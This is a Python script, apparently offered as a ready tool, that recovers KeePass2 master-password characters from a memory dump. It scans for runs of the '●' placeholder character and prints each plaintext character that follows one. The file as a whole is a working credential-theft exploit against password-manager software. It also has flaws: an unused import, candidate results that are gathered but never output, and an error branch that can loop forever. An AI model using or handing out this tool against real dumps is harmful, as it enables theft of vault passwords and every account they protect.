import requests
import argparse
import re
from collections import defaultdict

def main():
    parser = argparse.ArgumentParser(
        prog = 'KeePass2 dump file cracker',
        description = 'cracks passwords in KeePass2 dumps in python',
        epilog = 'there are no more arguments'
    )
    parser.add_argument(
        "-f", "--file",
        required = True,
        help = "file with password dump"
    )
    
    args = parser.parse_args()

    bufferSize = 524288
    allowedChars = "^[\x20-\xFF]+$"
    currentStrLen = 0
    debugStr = ""
    passwordChar = "●"
    candidates = defaultdict(set)


    with open(args.file,"rb") as fileDump:
        while True:
            data = fileDump.read(bufferSize)
            if not data:
                break
            i=0

            bufferRead = len(data)

            while i < bufferRead-1:
                if data[i] == 0xCF and data[i+1] == 0x25: #unicode character checker, this is \u25CF
                    currentStrLen+=1
                    i+=2
                    debugStr = debugStr + passwordChar
                    continue
                else:
                    if currentStrLen==0:
                        i+=1
                        continue

                    try:
                        currentStrLen+=1
                        character = data[i:i+2]
                        strChar = character.decode("utf-16-le")
                    except UnicodeDecodeError:
                        continue

                    test = re.findall(allowedChars,strChar)

                    if len(test) >= 1:
                        candidates[currentStrLen].add(strChar)
                        debugStr+=strChar
                        print(f"Found: {debugStr}")
                    
                currentStrLen = 0
                debugStr = ""
                i+=1


if __name__ == "__main__":
    main()
